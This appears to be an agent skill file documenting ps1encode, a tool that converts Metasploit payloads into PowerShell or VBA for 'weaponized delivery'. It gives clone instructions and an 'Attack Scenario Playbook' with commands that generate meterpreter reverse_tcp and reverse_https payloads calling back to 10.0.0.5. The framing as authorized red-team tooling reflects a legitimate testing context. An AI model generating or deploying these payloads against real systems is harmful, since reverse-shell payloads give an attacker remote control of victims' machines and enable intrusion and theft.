---
name: ps1encode-ps
description: "ps1encode: Converts MSF payloads to PowerShell. Signals: payload development, weaponization, VBA output."
zh-signals: "ps1encode: MSF payload PowerShell 化。信号:载荷开发,武器化,VBA 输出。"
when-to-use: "Use when converting an MSF payload into PowerShell or VBA output for weaponized delivery in an authorized engagement."
---

# ps1encode

- Attack Category: C07 Payload Development and Weaponization
- Upstream Repository: https://github.com/CroweCybersecurity/ps1encode
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/CroweCybersecurity/ps1encode
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `ruby ps1encode.rb -i x86/meterpreter/reverse_tcp -a 10.0.0.5 -p 4444` | PowerShell encoding |
| `-a arch -i payload -p port` | Parameters |
| `-t vba` | VBA output |

## Attack Scenario Playbook

### MSF payload to PowerShell

```bash
ruby ps1encode.rb -i x64/meterpreter_reverse_https -a 10.0.0.5 -p 443
# One-shot encoding
```

## Notes

Converts MSF payloads to PowerShell with multiple encodings.
